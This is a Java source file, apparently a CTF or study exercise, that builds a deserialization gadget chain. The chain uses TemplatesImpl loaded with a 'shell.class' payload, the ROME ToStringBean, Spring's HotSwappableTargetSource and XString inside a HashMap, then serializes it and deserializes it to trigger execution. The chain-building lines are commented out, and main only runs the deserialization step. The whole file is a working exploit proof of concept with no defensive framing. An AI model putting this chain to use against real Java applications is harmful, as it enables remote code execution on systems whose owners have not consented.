package org.example;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.lang.reflect.Field;
import java.util.HashMap;

public class HotSwappableTargetSourceTest {
    public static void main(String[] args) throws Exception {
//        TemplatesImpl templates = new TemplatesImpl();
//        byte[] bytes = Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\rome\\shell.class"));
//        setValue(templates,"_name","aaa");
//        setValue(templates,"_bytecodes",new byte[][]{bytes});
//        setValue(templates,"_tfactory",new TransformerFactoryImpl());
//
//        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
//        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
//        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));
//        HashMap<Object,Object> hashMap = new HashMap<>();
//        hashMap.put(h1,"h1");
//        hashMap.put(h2,"h2");
//        setValue(toStringBean,"_obj",templates);
//        serialize(hashMap);
        unserialize("ser.bin");
    }

    private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
